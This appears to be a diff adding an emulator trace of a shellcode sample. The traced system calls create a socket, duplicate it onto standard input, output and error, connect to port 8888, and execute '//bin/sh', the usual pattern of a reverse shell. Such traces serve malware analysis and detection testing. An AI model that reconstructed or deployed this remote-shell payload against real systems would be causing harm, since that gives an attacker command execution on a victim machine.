@@ -1,0 +1,43 @@
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 0;
+) =  0;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 47138 (port=8888);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 0 (host=0.0.0.0);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fa6 => 
+           = "//bin/sh";
+     const char * argv[] = [
+           = 0x00416f9e => 
+               = 0x00416fa6 => 
+                   = "//bin/sh";
+           = 0x00000000 => 
+             none;
+     ];
+     const char * envp[] = 0x00000000 => 
+         none;
+) =  0;
